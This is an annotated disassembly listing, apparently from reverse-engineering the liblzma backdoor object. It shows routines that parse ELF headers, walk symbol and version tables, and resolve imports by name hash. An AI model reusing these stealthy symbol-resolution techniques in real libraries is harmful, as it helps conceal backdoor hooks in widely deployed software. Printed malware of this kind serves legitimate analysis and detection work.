.text.get_literal_prica:0000000000001652                                         ; parse_elf+197↑j
.text.get_literal_prica:0000000000001652                 mov     r9, [rbx+40h]
.text.get_literal_prica:0000000000001656                 test    r9, r9
.text.get_literal_prica:0000000000001659                 jz      short loc_167C
.text.get_literal_prica:000000000000165B                 cmp     rsi, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:000000000000165F                 jz      loc_1524
.text.get_literal_prica:0000000000001665                 mov     ecx, 18h
.text.get_literal_prica:000000000000166A                 mov     rax, rsi
.text.get_literal_prica:000000000000166D                 xor     edx, edx
.text.get_literal_prica:000000000000166F                 or      byte ptr [rbx+0D0h], 1
.text.get_literal_prica:0000000000001676                 div     rcx
.text.get_literal_prica:0000000000001679                 mov     [rbx+48h], eax
.text.get_literal_prica:000000000000167C
.text.get_literal_prica:000000000000167C loc_167C:                               ; CODE XREF: parse_elf+299↑j
.text.get_literal_prica:000000000000167C                 mov     rcx, [rbx+78h]
.text.get_literal_prica:0000000000001680                 test    rcx, rcx
.text.get_literal_prica:0000000000001683                 jz      short loc_16AA
.text.get_literal_prica:0000000000001685                 cmp     r14, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:0000000000001689                 jz      loc_1524
.text.get_literal_prica:000000000000168F                 mov     r10d, 18h
.text.get_literal_prica:0000000000001695                 mov     rax, r14
.text.get_literal_prica:0000000000001698                 xor     edx, edx
.text.get_literal_prica:000000000000169A                 or      byte ptr [rbx+0D0h], 2
.text.get_literal_prica:00000000000016A1                 div     r10
.text.get_literal_prica:00000000000016A4                 mov     [rbx+80h], eax
.text.get_literal_prica:00000000000016AA
.text.get_literal_prica:00000000000016AA loc_16AA:                               ; CODE XREF: parse_elf+2C3↑j
.text.get_literal_prica:00000000000016AA                 mov     rax, [rbx+88h]
.text.get_literal_prica:00000000000016B1                 test    rax, rax
.text.get_literal_prica:00000000000016B4                 jz      short loc_16D4
.text.get_literal_prica:00000000000016B6                 cmp     r13, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:00000000000016BA                 jz      loc_1524
.text.get_literal_prica:00000000000016C0                 mov     rdx, r13
.text.get_literal_prica:00000000000016C3                 or      byte ptr [rbx+0D0h], 4
.text.get_literal_prica:00000000000016CA                 shr     rdx, 3
.text.get_literal_prica:00000000000016CE                 mov     [rbx+90h], edx
.text.get_literal_prica:00000000000016D4
.text.get_literal_prica:00000000000016D4 loc_16D4:                               ; CODE XREF: parse_elf+2F4↑j
.text.get_literal_prica:00000000000016D4                 cmp     qword ptr [rbx+60h], 0
.text.get_literal_prica:00000000000016D9                 jz      short loc_16EE
.text.get_literal_prica:00000000000016DB                 test    edi, edi
.text.get_literal_prica:00000000000016DD                 jnz     short loc_16E7
.text.get_literal_prica:00000000000016DF                 xor     edi, edi
.text.get_literal_prica:00000000000016E1                 mov     [rbx+60h], rdi
.text.get_literal_prica:00000000000016E5                 jmp     short loc_16EE
.text.get_literal_prica:00000000000016E7 ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000016E7
.text.get_literal_prica:00000000000016E7 loc_16E7:                               ; CODE XREF: parse_elf+31D↑j
.text.get_literal_prica:00000000000016E7                 or      byte ptr [rbx+0D0h], 8
.text.get_literal_prica:00000000000016EE
.text.get_literal_prica:00000000000016EE loc_16EE:                               ; CODE XREF: parse_elf+319↑j
.text.get_literal_prica:00000000000016EE                                         ; parse_elf+325↑j
.text.get_literal_prica:00000000000016EE                 mov     rdx, [rbx+30h]
.text.get_literal_prica:00000000000016F2                 test    rdx, rdx
.text.get_literal_prica:00000000000016F5                 jz      loc_1524
.text.get_literal_prica:00000000000016FB                 mov     rdi, [rbx+38h]
.text.get_literal_prica:00000000000016FF                 test    r15, r15
.text.get_literal_prica:0000000000001702                 jz      loc_1524
.text.get_literal_prica:0000000000001708                 test    rdi, rdi
.text.get_literal_prica:000000000000170B                 jz      loc_1524
.text.get_literal_prica:0000000000001711                 cmp     r12, rdx
.text.get_literal_prica:0000000000001714                 jb      short loc_175E
.text.get_literal_prica:0000000000001716                 add     rdx, r12
.text.get_literal_prica:0000000000001719                 add     rdi, r12
.text.get_literal_prica:000000000000171C                 mov     [rbx+30h], rdx
.text.get_literal_prica:0000000000001720                 mov     [rbx+38h], rdi
.text.get_literal_prica:0000000000001724                 test    r9, r9
.text.get_literal_prica:0000000000001727                 jz      short loc_1730
.text.get_literal_prica:0000000000001729                 add     r9, r12
.text.get_literal_prica:000000000000172C                 mov     [rbx+40h], r9
.text.get_literal_prica:0000000000001730
.text.get_literal_prica:0000000000001730 loc_1730:                               ; CODE XREF: parse_elf+367↑j
.text.get_literal_prica:0000000000001730                 test    rcx, rcx
.text.get_literal_prica:0000000000001733                 jz      short loc_173C
.text.get_literal_prica:0000000000001735                 add     rcx, r12
.text.get_literal_prica:0000000000001738                 mov     [rbx+78h], rcx
.text.get_literal_prica:000000000000173C
.text.get_literal_prica:000000000000173C loc_173C:                               ; CODE XREF: parse_elf+373↑j
.text.get_literal_prica:000000000000173C                 test    rax, rax
.text.get_literal_prica:000000000000173F                 jz      short loc_174B
.text.get_literal_prica:0000000000001741                 add     rax, r12
.text.get_literal_prica:0000000000001744                 mov     [rbx+88h], rax
.text.get_literal_prica:000000000000174B
.text.get_literal_prica:000000000000174B loc_174B:                               ; CODE XREF: parse_elf+37F↑j
.text.get_literal_prica:000000000000174B                 mov     rax, [rbx+70h]
.text.get_literal_prica:000000000000174F                 test    rax, rax
.text.get_literal_prica:0000000000001752                 jz      short loc_175B
.text.get_literal_prica:0000000000001754                 add     rax, r12
.text.get_literal_prica:0000000000001757                 mov     [rbx+70h], rax
.text.get_literal_prica:000000000000175B
.text.get_literal_prica:000000000000175B loc_175B:                               ; CODE XREF: parse_elf+392↑j
.text.get_literal_prica:000000000000175B                 add     r15, r12
.text.get_literal_prica:000000000000175E
.text.get_literal_prica:000000000000175E loc_175E:                               ; CODE XREF: parse_elf+354↑j
.text.get_literal_prica:000000000000175E                 mov     rax, [rbx+60h]
.text.get_literal_prica:0000000000001762                 test    rax, rax
.text.get_literal_prica:0000000000001765                 jz      short loc_1773
.text.get_literal_prica:0000000000001767                 cmp     rax, r12
.text.get_literal_prica:000000000000176A                 jnb     short loc_1773
.text.get_literal_prica:000000000000176C                 add     r12, rax
.text.get_literal_prica:000000000000176F                 mov     [rbx+60h], r12
.text.get_literal_prica:0000000000001773
.text.get_literal_prica:0000000000001773 loc_1773:                               ; CODE XREF: parse_elf+3A5↑j
.text.get_literal_prica:0000000000001773                                         ; parse_elf+3AA↑j
.text.get_literal_prica:0000000000001773                 mov     rax, [rbx+40h]
.text.get_literal_prica:0000000000001777                 test    rax, rax
.text.get_literal_prica:000000000000177A                 jz      short loc_1797
.text.get_literal_prica:000000000000177C                 mov     rdx, rsi
.text.get_literal_prica:000000000000177F                 mov     ecx, 4
.text.get_literal_prica:0000000000001784                 mov     rsi, rax
.text.get_literal_prica:0000000000001787                 mov     rdi, rbx
.text.get_literal_prica:000000000000178A                 call    process_elf_seg ; PIC mode
.text.get_literal_prica:000000000000178F                 test    eax, eax
.text.get_literal_prica:0000000000001791                 jz      loc_1524
.text.get_literal_prica:0000000000001797
.text.get_literal_prica:0000000000001797 loc_1797:                               ; CODE XREF: parse_elf+3BA↑j
.text.get_literal_prica:0000000000001797                 mov     rsi, [rbx+78h]
.text.get_literal_prica:000000000000179B                 test    rsi, rsi
.text.get_literal_prica:000000000000179E                 jz      short loc_17B8
.text.get_literal_prica:00000000000017A0                 mov     ecx, 4
.text.get_literal_prica:00000000000017A5                 mov     rdx, r14
.text.get_literal_prica:00000000000017A8                 mov     rdi, rbx
.text.get_literal_prica:00000000000017AB                 call    process_elf_seg ; PIC mode
.text.get_literal_prica:00000000000017B0                 test    eax, eax
.text.get_literal_prica:00000000000017B2                 jz      loc_1524
.text.get_literal_prica:00000000000017B8
.text.get_literal_prica:00000000000017B8 loc_17B8:                               ; CODE XREF: parse_elf+3DE↑j
.text.get_literal_prica:00000000000017B8                 mov     rsi, [rbx+88h]
.text.get_literal_prica:00000000000017BF                 test    rsi, rsi
.text.get_literal_prica:00000000000017C2                 jz      short loc_17DC
.text.get_literal_prica:00000000000017C4                 mov     ecx, 4
.text.get_literal_prica:00000000000017C9                 mov     rdx, r13
.text.get_literal_prica:00000000000017CC                 mov     rdi, rbx
.text.get_literal_prica:00000000000017CF                 call    process_elf_seg ; PIC mode
.text.get_literal_prica:00000000000017D4                 test    eax, eax
.text.get_literal_prica:00000000000017D6                 jz      loc_1524
.text.get_literal_prica:00000000000017DC
.text.get_literal_prica:00000000000017DC loc_17DC:                               ; CODE XREF: parse_elf+402↑j
.text.get_literal_prica:00000000000017DC                 mov     rsi, [rbx+60h]
.text.get_literal_prica:00000000000017E0                 test    rsi, rsi
.text.get_literal_prica:00000000000017E3                 jz      short loc_17FF
.text.get_literal_prica:00000000000017E5                 imul    rdx, [rbx+68h], 14h
.text.get_literal_prica:00000000000017EA                 mov     ecx, 4
.text.get_literal_prica:00000000000017EF                 mov     rdi, rbx
.text.get_literal_prica:00000000000017F2                 call    process_elf_seg ; PIC mode
.text.get_literal_prica:00000000000017F7                 test    eax, eax
.text.get_literal_prica:00000000000017F9                 jz      loc_1524
.text.get_literal_prica:00000000000017FF
.text.get_literal_prica:00000000000017FF loc_17FF:                               ; CODE XREF: parse_elf+423↑j
.text.get_literal_prica:00000000000017FF                 mov     eax, [r15]
.text.get_literal_prica:0000000000001802                 mov     [rbx+0D8h], eax
.text.get_literal_prica:0000000000001808                 mov     edx, [r15+8]
.text.get_literal_prica:000000000000180C                 mov     ecx, [r15+4]
.text.get_literal_prica:0000000000001810                 lea     esi, [rdx-1]
.text.get_literal_prica:0000000000001813                 add     edx, edx
.text.get_literal_prica:0000000000001815                 mov     [rbx+0DCh], esi
.text.get_literal_prica:000000000000181B                 lea     rsi, [r15+10h]
.text.get_literal_prica:000000000000181F                 mov     edi, [r15+0Ch]
.text.get_literal_prica:0000000000001823                 mov     [rbx+0E8h], rsi
.text.get_literal_prica:000000000000182A                 lea     rsi, [rsi+rdx*4]
.text.get_literal_prica:000000000000182E                 mov     edx, ecx
.text.get_literal_prica:0000000000001830                 sub     rax, rdx
.text.get_literal_prica:0000000000001833                 mov     [rbx+0E0h], edi
.text.get_literal_prica:0000000000001839                 mov     [rbx+0F0h], rsi
.text.get_literal_prica:0000000000001840                 lea     rax, [rsi+rax*4]
.text.get_literal_prica:0000000000001844                 mov     [rbx+0F8h], rax
.text.get_literal_prica:000000000000184B                 mov     eax, 1
.text.get_literal_prica:0000000000001850
.text.get_literal_prica:0000000000001850 loc_1850:                               ; CODE XREF: parse_elf+166↑j
.text.get_literal_prica:0000000000001850                 add     rsp, 10h
.text.get_literal_prica:0000000000001854                 pop     rbx
.text.get_literal_prica:0000000000001855                 pop     r12
.text.get_literal_prica:0000000000001857                 pop     r13
.text.get_literal_prica:0000000000001859                 pop     r14
.text.get_literal_prica:000000000000185B                 pop     r15
.text.get_literal_prica:000000000000185D                 retn
.text.get_literal_prica:000000000000185E ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000185E
.text.get_literal_prica:000000000000185E loc_185E:                               ; CODE XREF: parse_elf+7↑j
.text.get_literal_prica:000000000000185E                 xor     eax, eax
.text.get_literal_prica:0000000000001860                 retn
.text.get_literal_prica:0000000000001860 parse_elf       endp
.text.get_literal_prica:0000000000001860
.text.get_literal_prica:0000000000001860 _text_get_literal_prica ends
.text.get_literal_prica:0000000000001860
.text.crc_inia:0000000000001870 ; ===========================================================================
.text.crc_inia:0000000000001870
.text.crc_inia:0000000000001870 ; Segment type: Pure code
.text.crc_inia:0000000000001870 ; Segment permissions: Read/Execute
.text.crc_inia:0000000000001870 _text_crc_inia  segment para public 'CODE' use64
.text.crc_inia:0000000000001870                 assume cs:_text_crc_inia
.text.crc_inia:0000000000001870                 ;org 1870h
.text.crc_inia:0000000000001870                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.crc_inia:0000000000001870
.text.crc_inia:0000000000001870 ; =============== S U B R O U T I N E =======================================
.text.crc_inia:0000000000001870
.text.crc_inia:0000000000001870
.text.crc_inia:0000000000001870 ; char *__fastcall import_lookup_get_str(struct_elf_info *a1, int hash, int a3)
.text.crc_inia:0000000000001870                 public import_lookup_get_str
.text.crc_inia:0000000000001870 import_lookup_get_str proc near         ; CODE XREF: import_lookup_ex+A↓p
.text.crc_inia:0000000000001870                                         ; sub_2540+DF↓p ...
.text.crc_inia:0000000000001870
.text.crc_inia:0000000000001870 var_40          = qword ptr -40h
.text.crc_inia:0000000000001870 var_38          = dword ptr -38h
.text.crc_inia:0000000000001870 var_34          = dword ptr -34h
.text.crc_inia:0000000000001870 var_2E          = word ptr -2Eh
.text.crc_inia:0000000000001870 var_2C          = dword ptr -2Ch
.text.crc_inia:0000000000001870
.text.crc_inia:0000000000001870                 endbr64
.text.crc_inia:0000000000001874                 push    r15
.text.crc_inia:0000000000001876                 xor     ecx, ecx
.text.crc_inia:0000000000001878                 push    r14
.text.crc_inia:000000000000187A                 push    r13
.text.crc_inia:000000000000187C                 push    r12
.text.crc_inia:000000000000187E                 push    rbx
.text.crc_inia:000000000000187F                 mov     rbx, rdi
.text.crc_inia:0000000000001882                 mov     edi, 58h ; 'X'
.text.crc_inia:0000000000001887                 sub     rsp, 20h
.text.crc_inia:000000000000188B                 mov     [rsp+48h+var_2C], esi
.text.crc_inia:000000000000188F                 mov     esi, 0Fh
.text.crc_inia:0000000000001894                 mov     [rsp+48h+var_38], edx
.text.crc_inia:0000000000001898                 mov     edx, 3
.text.crc_inia:000000000000189D                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.crc_inia:00000000000018A2                 test    eax, eax
.text.crc_inia:00000000000018A4                 jnz     short loc_18AE
.text.crc_inia:00000000000018A6
.text.crc_inia:00000000000018A6 loc_18A6:                               ; CODE XREF: import_lookup_get_str+50↓j
.text.crc_inia:00000000000018A6                                         ; import_lookup_get_str+5C↓j ...
.text.crc_inia:00000000000018A6                 xor     r12d, r12d
.text.crc_inia:00000000000018A9                 jmp     loc_1AD5
.text.crc_inia:00000000000018AE ; ---------------------------------------------------------------------------
.text.crc_inia:00000000000018AE
.text.crc_inia:00000000000018AE loc_18AE:                               ; CODE XREF: import_lookup_get_str+34↑j
.text.crc_inia:00000000000018AE                 cmp     [rsp+48h+var_38], 0
.text.crc_inia:00000000000018B3                 jz      short loc_18C2
.text.crc_inia:00000000000018B5                 mov     al, [rbx+0D0h]
.text.crc_inia:00000000000018BB                 and     eax, 18h
.text.crc_inia:00000000000018BE                 cmp     al, 18h
.text.crc_inia:00000000000018C0                 jnz     short loc_18A6
.text.crc_inia:00000000000018C2
.text.crc_inia:00000000000018C2 loc_18C2:                               ; CODE XREF: import_lookup_get_str+43↑j
.text.crc_inia:00000000000018C2                 xor     r14d, r14d
.text.crc_inia:00000000000018C5
.text.crc_inia:00000000000018C5 loc_18C5:                               ; CODE XREF: import_lookup_get_str+106↓j
.text.crc_inia:00000000000018C5                 cmp     r14d, [rbx+0D8h]
.text.crc_inia:00000000000018CC                 jnb     short loc_18A6
.text.crc_inia:00000000000018CE                 mov     rdx, [rbx+0F0h]
.text.crc_inia:00000000000018D5                 mov     eax, r14d
.text.crc_inia:00000000000018D8                 mov     ecx, 4
.text.crc_inia:00000000000018DD                 mov     rdi, rbx
.text.crc_inia:00000000000018E0                 lea     r12, [rdx+rax*4]
.text.crc_inia:00000000000018E4                 mov     edx, 4
.text.crc_inia:00000000000018E9                 mov     rsi, r12
.text.crc_inia:00000000000018EC                 call    process_elf_seg ; PIC mode
.text.crc_inia:00000000000018F1                 test    eax, eax
.text.crc_inia:00000000000018F3                 jz      short loc_18A6
.text.crc_inia:00000000000018F5                 mov     edx, [r12]
.text.crc_inia:00000000000018F9                 mov     rax, [rbx+0F8h]
.text.crc_inia:0000000000001900                 mov     ecx, 4
.text.crc_inia:0000000000001905                 mov     rdi, rbx
.text.crc_inia:0000000000001908                 lea     rax, [rax+rdx*4]
.text.crc_inia:000000000000190C                 mov     edx, 8
.text.crc_inia:0000000000001911                 mov     rsi, rax
.text.crc_inia:0000000000001914                 mov     [rsp+48h+var_40], rax
.text.crc_inia:0000000000001919                 call    process_elf_seg ; PIC mode
.text.crc_inia:000000000000191E                 test    eax, eax
.text.crc_inia:0000000000001920                 jz      short loc_18A6
.text.crc_inia:0000000000001922
.text.crc_inia:0000000000001922 loc_1922:                               ; CODE XREF: import_lookup_get_str+101↓j
.text.crc_inia:0000000000001922                 mov     rax, [rsp+48h+var_40]
.text.crc_inia:0000000000001927                 mov     ecx, 4
.text.crc_inia:000000000000192C                 mov     edx, 18h
.text.crc_inia:0000000000001931                 mov     rdi, rbx
.text.crc_inia:0000000000001934                 sub     rax, [rbx+0F8h]
.text.crc_inia:000000000000193B                 sar     rax, 2
.text.crc_inia:000000000000193F                 mov     r13d, eax
.text.crc_inia:0000000000001942                 imul    r12, r13, 18h
.text.crc_inia:0000000000001946                 add     r12, [rbx+38h]
.text.crc_inia:000000000000194A                 mov     rsi, r12
.text.crc_inia:000000000000194D                 call    process_elf_seg ; PIC mode
.text.crc_inia:0000000000001952                 test    eax, eax
.text.crc_inia:0000000000001954                 jz      loc_18A6
.text.crc_inia:000000000000195A                 cmp     qword ptr [r12+8], 0
.text.crc_inia:0000000000001960                 jnz     short loc_197B
.text.crc_inia:0000000000001962
.text.crc_inia:0000000000001962 loc_1962:                               ; CODE XREF: import_lookup_get_str+112↓j
.text.crc_inia:0000000000001962                                         ; import_lookup_get_str+14C↓j ...
.text.crc_inia:0000000000001962                 add     [rsp+48h+var_40], 4
.text.crc_inia:0000000000001968                 mov     rax, [rsp+48h+var_40]
.text.crc_inia:000000000000196D                 test    byte ptr [rax-4], 1
.text.crc_inia:0000000000001971                 jz      short loc_1922
.text.crc_inia:0000000000001973                 inc     r14d
.text.crc_inia:0000000000001976                 jmp     loc_18C5
.text.crc_inia:000000000000197B ; ---------------------------------------------------------------------------
.text.crc_inia:000000000000197B
.text.crc_inia:000000000000197B loc_197B:                               ; CODE XREF: import_lookup_get_str+F0↑j
.text.crc_inia:000000000000197B                 cmp     word ptr [r12+6], 0
.text.crc_inia:0000000000001982                 jz      short loc_1962
.text.crc_inia:0000000000001984                 mov     eax, [r12]
.text.crc_inia:0000000000001988                 add     rax, [rbx+30h]
.text.crc_inia:000000000000198C                 mov     ecx, 4
.text.crc_inia:0000000000001991                 mov     rdi, rbx
.text.crc_inia:0000000000001994                 mov     edx, 1
.text.crc_inia:0000000000001999                 mov     rsi, rax
.text.crc_inia:000000000000199C                 mov     r15, rax
.text.crc_inia:000000000000199F                 call    process_elf_seg ; PIC mode
.text.crc_inia:00000000000019A4                 test    eax, eax
.text.crc_inia:00000000000019A6                 jz      loc_18A6
.text.crc_inia:00000000000019AC                 xor     esi, esi        ; unsigned __int64
.text.crc_inia:00000000000019AE                 mov     rdi, r15        ; _BYTE *
.text.crc_inia:00000000000019B1                 call    table_get       ; PIC mode
.text.crc_inia:00000000000019B6                 mov     ecx, [rsp+48h+var_2C]
.text.crc_inia:00000000000019BA                 cmp     eax, ecx
.text.crc_inia:00000000000019BC                 jnz     short loc_1962
.text.crc_inia:00000000000019BE                 cmp     [rsp+48h+var_38], 0
.text.crc_inia:00000000000019C3                 jz      loc_1AD5
.text.crc_inia:00000000000019C9                 add     r13, r13
.text.crc_inia:00000000000019CC                 add     r13, [rbx+70h]
.text.crc_inia:00000000000019D0                 mov     ecx, 4
.text.crc_inia:00000000000019D5                 mov     rdi, rbx
.text.crc_inia:00000000000019D8                 mov     edx, 2
.text.crc_inia:00000000000019DD                 mov     rsi, r13
.text.crc_inia:00000000000019E0                 call    process_elf_seg ; PIC mode
.text.crc_inia:00000000000019E5                 test    eax, eax
.text.crc_inia:00000000000019E7                 jz      loc_18A6
.text.crc_inia:00000000000019ED                 mov     al, [rbx+0D0h]
.text.crc_inia:00000000000019F3                 mov     dx, [r13+0]
.text.crc_inia:00000000000019F8                 and     eax, 18h
.text.crc_inia:00000000000019FB                 cmp     al, 18h
.text.crc_inia:00000000000019FD                 jnz     loc_1962
.text.crc_inia:0000000000001A03                 test    dx, 7FFEh
.text.crc_inia:0000000000001A08                 jz      loc_1962
.text.crc_inia:0000000000001A0E                 and     dx, 7FFFh
.text.crc_inia:0000000000001A13                 xor     eax, eax
.text.crc_inia:0000000000001A15                 mov     r13, [rbx+60h]
.text.crc_inia:0000000000001A19                 mov     [rsp+48h+var_2E], dx
.text.crc_inia:0000000000001A1E                 mov     [rsp+48h+var_34], eax
.text.crc_inia:0000000000001A22
.text.crc_inia:0000000000001A22 loc_1A22:                               ; CODE XREF: import_lookup_get_str+208↓j
.text.crc_inia:0000000000001A22                 mov     eax, [rsp+48h+var_34]
.text.crc_inia:0000000000001A26                 cmp     rax, [rbx+68h]
.text.crc_inia:0000000000001A2A                 jnb     loc_1962
.text.crc_inia:0000000000001A30                 mov     ecx, 4
.text.crc_inia:0000000000001A35                 mov     edx, 14h
.text.crc_inia:0000000000001A3A                 mov     rsi, r13
.text.crc_inia:0000000000001A3D                 mov     rdi, rbx
.text.crc_inia:0000000000001A40                 call    process_elf_seg ; PIC mode
.text.crc_inia:0000000000001A45                 test    eax, eax
.text.crc_inia:0000000000001A47                 jz      loc_1962
.text.crc_inia:0000000000001A4D                 cmp     word ptr [r13+0], 1
.text.crc_inia:0000000000001A53                 jnz     loc_1962
.text.crc_inia:0000000000001A59                 mov     ax, [rsp+48h+var_2E]
.text.crc_inia:0000000000001A5E                 cmp     ax, [r13+4]
.text.crc_inia:0000000000001A63                 jz      short loc_1A7A
.text.crc_inia:0000000000001A65
.text.crc_inia:0000000000001A65 loc_1A65:                               ; CODE XREF: import_lookup_get_str+263↓j
.text.crc_inia:0000000000001A65                 mov     eax, [r13+10h]
.text.crc_inia:0000000000001A69                 test    eax, eax
.text.crc_inia:0000000000001A6B                 jz      loc_1962
.text.crc_inia:0000000000001A71                 inc     [rsp+48h+var_34]
.text.crc_inia:0000000000001A75                 add     r13, rax
.text.crc_inia:0000000000001A78                 jmp     short loc_1A22
.text.crc_inia:0000000000001A7A ; ---------------------------------------------------------------------------
.text.crc_inia:0000000000001A7A
.text.crc_inia:0000000000001A7A loc_1A7A:                               ; CODE XREF: import_lookup_get_str+1F3↑j
.text.crc_inia:0000000000001A7A                 mov     r15d, [r13+0Ch]
.text.crc_inia:0000000000001A7E                 mov     ecx, 4
.text.crc_inia:0000000000001A83                 mov     edx, 8
.text.crc_inia:0000000000001A88                 mov     rdi, rbx
.text.crc_inia:0000000000001A8B                 add     r15, r13
.text.crc_inia:0000000000001A8E                 mov     rsi, r15
.text.crc_inia:0000000000001A91                 call    process_elf_seg ; PIC mode
.text.crc_inia:0000000000001A96                 test    eax, eax
.text.crc_inia:0000000000001A98                 jz      loc_1962
.text.crc_inia:0000000000001A9E                 mov     eax, [r15]
.text.crc_inia:0000000000001AA1                 add     rax, [rbx+30h]
.text.crc_inia:0000000000001AA5                 mov     ecx, 4
.text.crc_inia:0000000000001AAA                 mov     rdi, rbx
.text.crc_inia:0000000000001AAD                 mov     edx, 1
.text.crc_inia:0000000000001AB2                 mov     rsi, rax
.text.crc_inia:0000000000001AB5                 mov     r15, rax
.text.crc_inia:0000000000001AB8                 call    process_elf_seg ; PIC mode
.text.crc_inia:0000000000001ABD                 test    eax, eax
.text.crc_inia:0000000000001ABF                 jz      loc_1962
.text.crc_inia:0000000000001AC5                 xor     esi, esi        ; unsigned __int64
.text.crc_inia:0000000000001AC7                 mov     rdi, r15        ; _BYTE *
.text.crc_inia:0000000000001ACA                 call    table_get       ; PIC mode
.text.crc_inia:0000000000001ACF                 cmp     [rsp+48h+var_38], eax
.text.crc_inia:0000000000001AD3                 jnz     short loc_1A65
.text.crc_inia:0000000000001AD5
.text.crc_inia:0000000000001AD5 loc_1AD5:                               ; CODE XREF: import_lookup_get_str+39↑j
.text.crc_inia:0000000000001AD5                                         ; import_lookup_get_str+153↑j
.text.crc_inia:0000000000001AD5                 add     rsp, 20h
.text.crc_inia:0000000000001AD9                 mov     rax, r12
.text.crc_inia:0000000000001ADC                 pop     rbx
.text.crc_inia:0000000000001ADD                 pop     r12
.text.crc_inia:0000000000001ADF                 pop     r13
.text.crc_inia:0000000000001AE1                 pop     r14
.text.crc_inia:0000000000001AE3                 pop     r15
.text.crc_inia:0000000000001AE5                 retn
.text.crc_inia:0000000000001AE5 import_lookup_get_str endp
.text.crc_inia:0000000000001AE5
.text.crc_inia:0000000000001AE5 _text_crc_inia  ends
.text.crc_inia:0000000000001AE5
.text.crc64_generia:0000000000001AF0 ; ===========================================================================
.text.crc64_generia:0000000000001AF0
.text.crc64_generia:0000000000001AF0 ; Segment type: Pure code
.text.crc64_generia:0000000000001AF0 ; Segment permissions: Read/Execute
.text.crc64_generia:0000000000001AF0 _text_crc64_generia segment para public 'CODE' use64
.text.crc64_generia:0000000000001AF0                 assume cs:_text_crc64_generia
.text.crc64_generia:0000000000001AF0                 ;org 1AF0h
.text.crc64_generia:0000000000001AF0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.crc64_generia:0000000000001AF0
.text.crc64_generia:0000000000001AF0 ; =============== S U B R O U T I N E =======================================
.text.crc64_generia:0000000000001AF0
.text.crc64_generia:0000000000001AF0
.text.crc64_generia:0000000000001AF0 ; unsigned int *__fastcall import_lookup_ex(struct_elf_info *elfinfo, int hash)
.text.crc64_generia:0000000000001AF0                 public import_lookup_ex
.text.crc64_generia:0000000000001AF0 import_lookup_ex proc near              ; CODE XREF: _Linit_pric_table_part_1+6↓j
.text.crc64_generia:0000000000001AF0                                         ; parse_elf_init+6C9↓p
.text.crc64_generia:0000000000001AF0                                         ; DATA XREF: ...
.text.crc64_generia:0000000000001AF0                 endbr64
.text.crc64_generia:0000000000001AF4                 push    rbx
.text.crc64_generia:0000000000001AF5                 xor     edx, edx        ; a3
.text.crc64_generia:0000000000001AF7                 mov     rbx, rdi
.text.crc64_generia:0000000000001AFA                 call    import_lookup_get_str ; PIC mode
.text.crc64_generia:0000000000001AFF                 test    rax, rax
.text.crc64_generia:0000000000001B02                 jz      short loc_1B1E
.text.crc64_generia:0000000000001B04                 mov     rdx, [rax+8]
.text.crc64_generia:0000000000001B08                 test    rdx, rdx
.text.crc64_generia:0000000000001B0B                 jz      short loc_1B1C
.text.crc64_generia:0000000000001B0D                 cmp     word ptr [rax+6], 0
.text.crc64_generia:0000000000001B12                 jz      short loc_1B1C
.text.crc64_generia:0000000000001B14                 mov     rax, [rbx]
.text.crc64_generia:0000000000001B17                 add     rax, rdx
.text.crc64_generia:0000000000001B1A                 jmp     short loc_1B1E
.text.crc64_generia:0000000000001B1C ; ---------------------------------------------------------------------------
.text.crc64_generia:0000000000001B1C
.text.crc64_generia:0000000000001B1C loc_1B1C:                               ; CODE XREF: import_lookup_ex+1B↑j
.text.crc64_generia:0000000000001B1C                                         ; import_lookup_ex+22↑j
.text.crc64_generia:0000000000001B1C                 xor     eax, eax
.text.crc64_generia:0000000000001B1E
.text.crc64_generia:0000000000001B1E loc_1B1E:                               ; CODE XREF: import_lookup_ex+12↑j
.text.crc64_generia:0000000000001B1E                                         ; import_lookup_ex+2A↑j
.text.crc64_generia:0000000000001B1E                 pop     rbx
.text.crc64_generia:0000000000001B1F                 retn
.text.crc64_generia:0000000000001B1F import_lookup_ex endp
.text.crc64_generia:0000000000001B1F
.text.crc64_generia:0000000000001B20
.text.crc64_generia:0000000000001B20 ; =============== S U B R O U T I N E =======================================
.text.crc64_generia:0000000000001B20
.text.crc64_generia:0000000000001B20
.text.crc64_generia:0000000000001B20 ; unsigned __int64 __fastcall sub_1B20(unsigned __int64, unsigned __int64, __int64)
.text.crc64_generia:0000000000001B20 sub_1B20        proc near               ; CODE XREF: sub_7350+AD↓p
.text.crc64_generia:0000000000001B20                 mov     rax, rdi
.text.crc64_generia:0000000000001B23                 cmp     rsi, rdi
.text.crc64_generia:0000000000001B26                 jnb     short loc_1B4C
.text.crc64_generia:0000000000001B28                 lea     rcx, [rsi+rdx]
.text.crc64_generia:0000000000001B2C                 cmp     rdi, rcx
.text.crc64_generia:0000000000001B2F                 jnb     short loc_1B4C
.text.crc64_generia:0000000000001B31                 lea     rcx, [rdx-1]
.text.crc64_generia:0000000000001B35                 test    rdx, rdx
.text.crc64_generia:0000000000001B38                 jz      short locret_1B67
.text.crc64_generia:0000000000001B3A
.text.crc64_generia:0000000000001B3A loc_1B3A:                               ; CODE XREF: sub_1B20+29↓j
.text.crc64_generia:0000000000001B3A                 movzx   edx, byte ptr [rsi+rcx]
.text.crc64_generia:0000000000001B3E                 mov     [rax+rcx], dl
.text.crc64_generia:0000000000001B41                 sub     rcx, 1
.text.crc64_generia:0000000000001B45                 cmp     rcx, 0FFFFFFFFFFFFFFFFh
.text.crc64_generia:0000000000001B49                 jnz     short loc_1B3A
.text.crc64_generia:0000000000001B4B                 retn
.text.crc64_generia:0000000000001B4C ; ---------------------------------------------------------------------------
.text.crc64_generia:0000000000001B4C
.text.crc64_generia:0000000000001B4C loc_1B4C:                               ; CODE XREF: sub_1B20+6↑j
.text.crc64_generia:0000000000001B4C                                         ; sub_1B20+F↑j
.text.crc64_generia:0000000000001B4C                 mov     ecx, 0
.text.crc64_generia:0000000000001B51                 test    rdx, rdx
.text.crc64_generia:0000000000001B54                 jz      short locret_1B68
.text.crc64_generia:0000000000001B56
.text.crc64_generia:0000000000001B56 loc_1B56:                               ; CODE XREF: sub_1B20+45↓j
.text.crc64_generia:0000000000001B56                 movzx   edi, byte ptr [rsi+rcx]
.text.crc64_generia:0000000000001B5A                 mov     [rax+rcx], dil
